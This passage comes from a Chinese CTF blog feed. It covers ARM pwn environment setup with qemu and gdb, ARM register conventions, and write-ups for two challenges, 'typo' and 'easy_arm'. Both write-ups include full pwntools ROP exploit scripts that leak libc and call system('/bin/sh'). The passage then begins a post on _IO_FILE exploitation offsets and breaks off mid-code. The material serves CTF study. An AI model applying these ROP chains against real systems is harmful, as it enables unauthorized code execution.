设置架构（据说一般都会自动识别成功，不用设置），然后target remote ip:port 远程连接</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></figure></p><ol start="6"><li>脚本调试</li></ol><p>使用socat在本地运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi  ./pwn&quot;;reuseaddr</span><br></pre></td></tr></table></figure></p><p>脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remote 127.0.0.1:10002</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></p><p>这里将pause相当于断点，pause之后再开窗口打开gdb-multiarch进行调试，这样还是有点麻烦，但是现在不知道有什么好办法。</p><h1 id="关于ARM"><a href="#关于ARM" class="headerlink" title="关于ARM"></a>关于ARM</h1><p>参考：<a href="https://www.jianshu.com/p/bd96a8f58cbd" target="_blank" rel="noopener">https://www.jianshu.com/p/bd96a8f58cbd</a></p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/ARM_Calling_Convention.png" alt="arm''" title="" class="">                <p>arm''</p>            </figure><p>r0 - r3 存放参数 1-4 ，其余参数从右到左入栈； </p><p>被调用者实现栈平衡； </p><p>返回值存放在r0</p><p>R13 相当于栈指针ESP/RSP</p><p>PC 相当于EIP/RIP指针<br>LR link register 保存返回地址的寄存器</p><p>BL 相当于call ， 跳转并把返回值保存到LR中<br>B 相当于jmp<br>BX 跳转并切换状态 ARM 与THUMB 指令<br>BLX  带返回的跳转并切换状态</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>静态链接，简单的ROP，但是arm的看起来没那么熟悉；开启栈不可执行保护，其他没开</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先找下gadget，因为被strip了，没有了符号表，所以system无法直接找到<br>说是用rizzo可以恢复部分符号<br>因为要传一个参数，所以可以找下r0</p><ul><li>关于导入符号表</li></ul><p>先把导入的libc文件拿出来,使用rizzo导出为.riz文件</p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/export.png" alt="导出" title="" class="">                <p>导出</p>            </figure><p>再把riz导入文件</p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/import.png" alt="导入" title="" class="">                <p>导入</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary typo --only &apos;pop&apos; | grep r0</span><br><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br></pre></td></tr></table></figure><p>里面刚好还要pc，前面已经指定pc是相当于eip指针，所以这里可以顺便把system pop到 pc</p><p>关于偏移，理论上是可以用pwntools的cyclic，但是在arm程序里运行的不太对，不知道哪里出错了，只能爆破一下得到偏移</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;typo&apos;</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;typo&apos;])</span><br><span class="line">elf = ELF(&apos;./typo&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;127.0.01&apos;,&apos;10002&apos;)</span><br><span class="line">elf = ELF(&apos;./typo&apos;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">pop_r0_r4_pc = 0x00020904</span><br><span class="line">system = 0x110b4</span><br><span class="line">binsh = 0x6c384</span><br><span class="line">pay = &apos;a&apos;*112+p32(pop_r0_r4_pc)+p32(binsh)*2+p32(system)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&quot;&quot;)</span><br><span class="line">#pause()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-arm"><a href="#easy-arm" class="headerlink" title="easy_arm"></a>easy_arm</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>半决赛的题。。因为是arm的大部分就没做出来。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed int vul()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-24h]</span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  puts(&quot;your name:\n&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;hello %s\n&quot;, &amp;buf);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>寻找可用的gadget，为了后面能够进行参数传递势必要能够控制r0</p><p>直接用ROPgadget only pop时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary &apos;ciscn_2019_en_1&apos;  --only &apos;pop&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000103a4 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000104f8 : pop &#123;r4, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure></p><p>这里只能够直接控制r3 和返回地址pc ，所以还需要找点其他的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010638 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; ; andeq r0, r1, r8, lsl sb ; andeq r0, r1, r0, lsl sb ; bx lr</span><br></pre></td></tr></table></figure><p>这边发现能控制很多寄存器，但是没有r0；单独寻找r0相关，找到了这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010628 : mov r0, r7 ; blx r3</span><br></pre></td></tr></table></figure></p><p>因为上一步能够控制r7，也就相当于可以控制这里的r0。构造rop链，第一次进行泄露libc地址，第二次getshell</p><p>中间发现使用上面的构造链会泄露完地址就fault退出，不过也发现了基址是不变的，可以泄露完再打一次getshell</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;ciscn_2019_en_1&apos;</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line">elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line">libc = ELF(&apos;/usr/arm-linux-gnueabi/lib/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line"></span><br><span class="line">mov_r07_br3 = 0x10628</span><br><span class="line">pop_r3_pc = 0x103a4</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">pop_r45678sbslpc = 0x10638</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(puts_got) #r7</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc) #pc</span><br><span class="line">pay += p32(puts_plt) #r3</span><br><span class="line">pay += p32(mov_r07_br3) #pc</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">puts_addr = u32(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(4,&apos;\x00&apos;))</span><br><span class="line">libc.base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">print hex(libc.base)</span><br><span class="line">system_addr = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(binsh_addr)</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc)</span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += p32(mov_r07_br3)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="之前的尝试笔记"><a href="#之前的尝试笔记" class="headerlink" title="之前的尝试笔记"></a>之前的尝试笔记</h1><p>之前做到的比较好的地方在于动态链接程序也能直接跑而不用指定库，应该是建立的软连接和导入库路径的设置</p><h2 id="arm-程序运行"><a href="#arm-程序运行" class="headerlink" title="arm 程序运行"></a>arm 程序运行</h2><ol><li><p>安装必要的程序 qemu  gcc for arm 交叉编译 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu gcc-5-arm-linux-gnueabihf gcc-5-multilib-arm-linux-gnueabihf</span><br></pre></td></tr></table></figure></li><li><p>运行arm文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm ./filename</span><br></pre></td></tr></table></figure></li></ol><p>提示找不到库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/ld-linux-armhf.so.3: No such file or directory</span><br></pre></td></tr></table></figure></p><p>查找并建立软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name ld-linux-armhf.so.3</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3</span><br></pre></td></tr></table></figure></p><p>再运行找不到libc.so.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure></p><p>方便起见写入自启动脚本（一般还是不要写的好。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH&quot; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></p><h2 id="arm-gdb"><a href="#arm-gdb" class="headerlink" title="arm-gdb"></a>arm-gdb</h2><p>gdb源码下载：<a href="http://www.gnu.org/software/gdb/download/" target="_blank" rel="noopener">http://www.gnu.org/software/gdb/download/</a></p><p>gdb 版本不要太高，这里选择和本机一个版本的gdb</p><p>解压：tar xvf gdb-7.11.1.tar.xz</p><p>安装可能需要的库</p><p>sudo apt-get install  texinfo libncurses5-dev m4 flex bison</p><ul><li>编译arm-linux-gdb  &amp; gdbserver</li></ul><p>进入源码目录： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=arm-linux --prefix=/home/sirius/tools/gdb/arm-gdb</span><br><span class="line">make -j8</span><br><span class="line">sudo make install -j8</span><br></pre></td></tr></table></figure><p>这里可能会报错说__NR_rt_sigreturn未定义<br>加个头文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifndef  __NR_sigreturn</span><br><span class="line">#include &lt;asm/unistd.h&gt;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p><p>arm-gdb/bin 下可以看到 arm-linux-gdb arm-linux-run</p><p>将其加入环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/profile</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br></pre></td></tr></table></figure><ul><li>编译gdb client</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd gdb/gdbserver</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br><span class="line">./configure --target=arm-linux --host=arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">vi config.h</span><br><span class="line">#define HAVA_SYS_REG_H  将此句注释</span><br><span class="line"></span><br><span class="line">make CC=arm-linux-gnueabi-gcc  -j8</span><br></pre></td></tr></table></figure><p>这里可能会报错说没有arm-linux-gnueabi-gcc， 使用apt安装就可以了</p><ul><li>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver :1234 ./pwn</span><br></pre></td></tr></table></figure></li></ul><p>这里调试的时候便会出错</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;为了搭建这个环境费了好多心思，也花了好久好久~~~，网上的教程大多都是arm的板子的调试，最后终于找到了简单合适的办法&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>_IO_FILE 利用方法</title>
    <link href="http://siriuswhiter.tk/2019/07/09/io-file-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://siriuswhiter.tk/2019/07/09/io-file-利用方法/</id>
    <published>2019-07-09T07:51:56.000Z</published>
    <updated>2019-09-28T09:22:53.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>细节知识可以看<a href="https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p><p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。<br><figure class="image-box">                <img src="/2019/07/09/io-file-利用方法/1.png" alt="图示" title="" class="">                <p>图示</p>            </figure></p><p>所以新建的文件句柄的chains会指向stderr</p><p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下：</p><p>struct _IO_FILE_plus<br>{<br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}</p><p>输出方法,eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *) stdout</span><br></pre></td></tr></table></figure></p><h3 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="IO_FILE 结构体"></a>IO_FILE 结构体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;/* End of get area. */</span><br><span class="line">  char* _IO_read_base;/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;                       /* 偏移： 0x68-0x70 */</span><br><span class="line"></span><br><span class="line">  int _fileno;                                   /* 文件描述符 fd */</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;                    </span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="偏移记录"><a href="#偏移记录" class="headerlink" title="偏移记录"></a>偏移记录</h3><p>方便在使用时查看偏移进行伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">&apos;i386&apos;:0x98,</span><br><span class="line">&apos;amd64&apos;:0xe0</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">&apos;i386&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x4:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x8:&apos;_IO_read_end&apos;,</span><br><span class="line">0xc:&apos;_IO_read_base&apos;,</span><br><span class="line">0x10:&apos;_IO_write_base&apos;,</span><br><span class="line">0x14:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x18:&apos;_IO_write_end&apos;,</span><br><span class="line">0x1c:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x20:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x24:&apos;_IO_save_base&apos;,</span><br><span class="line">0x28:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x2c:&apos;_IO_save_end&apos;,</span><br><span class="line">0x30:&apos;_markers&apos;,</span><br><span class="line">0x34:&apos;_chain&apos;,</span><br><span class="line">0x38:&apos;_fileno&apos;,</span><br><span class="line">0x3c:&apos;_flags2&apos;,</span><br><span class="line">0x40:&apos;_old_offset&apos;,</span><br><span class="line">0x44:&apos;_cur_column&apos;,</span><br><span class="line">0x46:&apos;_vtable_offset&apos;,</span><br><span class="line">0x47:&apos;_shortbuf&apos;,</span><br><span class="line">0x48:&apos;_lock&apos;,</span><br><span class="line">0x4c:&apos;_offset&apos;,</span><br><span class="line">0x54:&apos;_codecvt&apos;,</span><br><span class="line">0x58:&apos;_wide_data&apos;,</span><br><span class="line">0x5c:&apos;_freeres_list&apos;,</span><br><span class="line">0x60:&apos;_freeres_buf&apos;,</span><br><span class="line">0x64:&apos;__pad5&apos;,</span><br><span class="line">0x68:&apos;_mode&apos;,</span><br><span class="line">0x6c:&apos;_unused2&apos;,</span><br><span class="line">0x94:&apos;vtable&apos;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&apos;amd64&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x8:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x10:&apos;_IO_read_end&apos;,</span><br><span class="line">0x18:&apos;_IO_read_base&apos;,</span><br><span class="line">0x20:&apos;_IO_write_base&apos;,</span><br><span class="line">0x28:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x30:&apos;_IO_write_end&apos;,</span><br><span class="line">0x38:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x40:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x48:&apos;_IO_save_base&apos;,</span><br><span class="line">0x50:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x58:&apos;_IO_save_end&apos;,</span><br><span class="line">0x60:&apos;_markers&apos;,</span><br><span class="line">0x68:&apos;_chain&apos;,</span><br><span class="line">0x70:&apos;_fileno&apos;,</span><br><span class="line">0x74:&apos;_flags2&apos;,</span><br><span class="line">0x78:&apos;_old_offset&apos;,</span><br><span class="line">0x80:&apos;_cur_column&apos;,</span><br><span class="line">0x82:&apos;_vtable_offset&apos;,</span><br><span class="line">0x83:&apos;_shortbuf&apos;,</span><br><span class="line">0x88:&apos;_lock&apos;,</span><br><span class="line">0x90:&apos;_offset&apos;,</span><br><span class="line">0x98:&apos;_codecvt&apos;,</span><br><span class="line">0xa0:&apos;_wide_data&apos;,</span><br><span class="line">0xa8:&apos;_freeres_list&apos;,</span><br><span class="line">0xb0:&apos;_freeres_buf&apos;,</span><br><span class="line">0xb8:&apos;__pad5&apos;,</span><br><span class="line">0xc0:&apos;_mode&apos;,</span><br><span class="line">0xc4:&apos;_unused2&apos;,</span><br><span class="line">0xd8:&apos;vtable&apos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IO-jump-t表结构"><a href="#IO-jump-t表结构" class="headerlink" title="IO_jump_t表结构"></a>IO_jump_t表结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, 